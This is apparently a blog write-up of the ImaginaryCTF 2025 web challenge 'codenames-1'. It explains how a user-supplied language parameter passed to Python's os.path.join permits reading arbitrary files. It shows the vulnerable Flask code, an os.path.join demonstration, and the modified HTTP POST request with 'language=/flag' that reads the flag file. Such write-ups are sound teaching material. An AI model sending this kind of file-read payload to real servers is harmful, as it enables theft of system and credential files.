---
layout: post
title: "[ImaginaryCTF 2025] codenames-1"
author: george
---

> I hear that multilingual codenames is all the rage these days. Flag is in /flag.txt.
>
> http://codenames-1.chal.imaginaryctf.org/
>
> attachments: [codenames.zip](https://2025.imaginaryctf.org/files/codenames-1/codenames.zip)

This challenge was solved as a result of me freeloading off [Lyndon](/authors/lydxn) when I was at the Maple Bacon CTF club meetup. I started this challenge up locally and played around with it. The application seemed to be some sort of 2 player game in which you could either play with another player or play with a bot.

![picture of codenames game being played](/assets/images/imaginaryctf2025/codenames-1.png)

I spent an hour looking around struggling to read the source code and figuring out how to debug the application locally, when Lyndon shows up out of nowhere, introduces himself, solves my application debugging problems, and starts reading the source code with me. Within 5 minutes, he spots these lines in the game creation endpoint:

```python
@app.route("/create_game", methods=["POST"])
def create_game():
    ...
    language = request.form.get("language", None)
    ...
    if language:
        wl_path = os.path.join(WORDS_DIR, f"{language}.txt")
        ...
```

One thing to note is that the `language` body parameter passed into the
`os.path.join` function via a f-string is user controllable, allowing us to specify what file we wish to read. Another thing to note (which Lyndon pointed out to me when I was trying to solve the challenge) is that if the 2nd argument of
`os.path.join` starts with `/`, then the first argument is ignored entirely, as shown below:

```python
os.path.join("words", "en.txt")
# 'words/en.txt'

os.path.join("words", "/flag.txt")
# '/flag.txt'
```

Upon figuring this out, we created a new game with the default language set and captured the network request.

```http
POST /create_game HTTP/1.1
Host: codenames-1.chal.imaginaryctf.org
Connection: keep-alive

language=de
```

We then sent a modified request to the server, swapping out the language to be `/flag` instead of `de`.

```http
POST /create_game HTTP/1.1
Host: codenames-1.chal.imaginaryctf.org
Connection: keep-alive

language=/flag
```

Upon starting the game that was generated using our modified request, we noticed that all words were replaced with the flag, solving us the challenge.

![flags replacing words in codenames board](/assets/images/imaginaryctf2025/codenames-1-flag.png)

flag: `ictf{common_os_path_join_L_b19d35ca}`
